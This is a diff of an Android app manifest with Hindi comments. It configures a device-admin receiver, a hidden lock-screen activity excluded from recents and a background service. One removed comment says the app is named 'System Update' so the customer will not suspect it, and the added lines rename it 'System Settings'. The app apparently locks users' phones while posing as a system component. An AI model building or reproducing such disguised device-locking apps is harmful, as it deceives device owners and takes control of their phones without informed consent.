@@ -4,13 +4,13 @@
 
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.CAMERA" />
-    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
-    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" /> <!-- Lock Screen के लिए -->
+    
+    <!-- Lock Task Mode के लिए -->
+    <uses-permission android:name="android.permission.MANAGE_DEVICE_ADMINS" />
 
     <application
-        android:allowBackup="true"
         android:icon="@mipmap/ic_launcher"
-        android:label="System Update" <!-- कस्टमर को शक न हो इसलिए नाम System Update रख सकते हैं -->
+        android:label="System Settings"
         android:theme="@style/Theme.AppCompat.Light.NoActionBar">
         
         <activity android:name=".MainActivity" android:exported="true">
@@ -20,11 +20,19 @@
             </intent-filter>
         </activity>
 
-        <!-- Device Admin Receiver -->
+        <!-- यह है आपकी Lock Screen, इसे Home Launcher से हटा दिया गया है -->
+        <activity 
+            android:name=".LockActivity" 
+            android:launchMode="singleInstance"
+            android:showOnLockScreen="true"
+            android:excludeFromRecents="true"
+            android:exported="false" />
+
+        <!-- बैकग्राउंड सर्विस -->
+        <service android:name=".LockListenerService" android:exported="false" />
+
         <receiver
             android:name=".MyAdminReceiver"
-            android:description="@string/app_name"
-            android:label="@string/app_name"
             android:permission="android.permission.BIND_DEVICE_ADMIN"
             android:exported="true">
             <meta-data
@@ -34,6 +42,5 @@
                 <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
             </intent-filter>
         </receiver>
-
     </application>
 </manifest>
